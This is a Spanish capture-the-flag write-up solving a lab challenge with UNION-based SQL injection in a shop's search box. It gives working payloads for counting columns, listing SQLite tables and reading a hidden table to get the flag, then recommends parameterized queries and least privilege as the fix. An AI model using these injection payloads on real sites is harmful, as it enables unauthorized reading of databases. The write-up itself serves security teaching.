Reto 10: UNION SELECT abre la bóveda

La misma tienda del reto 09 tiene un buscador de productos. El secreto está en otra tabla que la web nunca muestra.

La idea

El buscador ejecuta algo como esto:

SELECT nombre, precio, descripcion FROM productos WHERE nombre LIKE '%LO_QUE_ESCRIBO%'

Si cierro la cadena, puedo añadir un UNION SELECT que lea otra tabla, y sus filas aparecerán en la tabla de resultados. La única condición es que las dos consultas tengan el mismo número de columnas.

Paso a paso

  1. Confirmar la inyección: busco ' y salta un error de base de datos.
  2. Contar columnas: ' UNION SELECT 1,2 -- da error, y ' UNION SELECT 1,2,3 -- funciona. Son 3.
  3. Listar tablas con el catálogo de SQLite: 
    ' UNION SELECT name, type, sql FROM sqlite_master --
    Aparecen usuarios y boveda(id, secreto).
  4. Leer la bóveda. Tiene 2 columnas y necesito 3, así que relleno la que falta con una constante: 
    ' UNION SELECT secreto, id, 'x' FROM boveda --
    La flag aparece en la columna «Nombre»: CENTINELA{…}.

Lección

Una inyección SQL no solo sirve para saltarse un login: deja leer toda la base de datos, incluso tablas que la aplicación nunca usa. El arreglo es el mismo que en el reto 09, consultas parametrizadas, y además que el usuario de la base de datos de la web solo tenga permiso sobre las tablas que necesita (mínimo privilegio).
